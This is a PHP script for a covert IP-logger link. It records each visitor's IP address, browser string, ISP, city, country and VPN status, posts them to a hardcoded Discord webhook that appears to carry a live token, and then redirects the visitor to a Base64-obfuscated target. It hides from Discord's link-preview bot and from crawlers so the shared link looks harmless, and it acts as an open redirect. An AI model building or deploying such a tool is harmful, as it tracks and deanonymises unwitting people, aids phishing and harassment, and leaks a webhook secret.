<?php
// ============================================
// IP Logger + Redirect Website
// ============================================

$webhookurl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";

// Configuration
$config = [
    'default_redirect' => 'https://discord.gg/fMbZNhGVmh',  // Where to send if no target specified
    'log_file' => 'clicks.json',                  // Local backup log (optional)
    'require_param' => 'url',                      // ?url= parameter name
    'obfuscate' => true                            // Base64 decode URLs for stealth
];

// ============================================
// LOGGING FUNCTION (Your existing code, enhanced)
// ============================================
function logVisitor($webhookurl) {
    $ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];
    
    // Block bots
    if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
        return false;
    }
    
    $TheirDate = date('d/m/Y');
    $TheirTime = date('G:i:s');
    
    // Get IP details
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
    
    $vpn = ($vpnCon->connection_type === "Corporate") ? "Yes" : "No";
    $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
    
    $data = "**🎯 New Click**\n**IP:** `$ip`\n**ISP:** {$details->isp}\n**Date:** $TheirDate\n**Time:** $TheirTime\n**Location:** {$details->city}, {$details->region}\n**Country:** {$details->country}\n**VPN:** $vpn\n**Browser:** $browser";
    
    $json_data = [
        'content' => $data,
        'username' => "Visitor from {$details->country}",
        'avatar_url' => $flag
    ];
    
    // Send to Discord
    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    return true;
}

// ============================================
// REDIRECT HANDLER
// ============================================

// Get target URL from query parameter or path
$target = isset($_GET[$config['require_param']]) ? $_GET[$config['require_param']] : null;

// If obfuscated (Base64), decode it
if ($target && $config['obfuscate']) {
    $decoded = base64_decode($target, true);
    if ($decoded !== false) {
        $target = $decoded;
    }
}

// Validate URL
if (!$target || !filter_var($target, FILTER_VALIDATE_URL)) {
    $target = $config['default_redirect'];
}

// Log the visit
logVisitor($webhookurl);

// Perform redirect
header("Location: " . $target, true, 302);
exit();
?>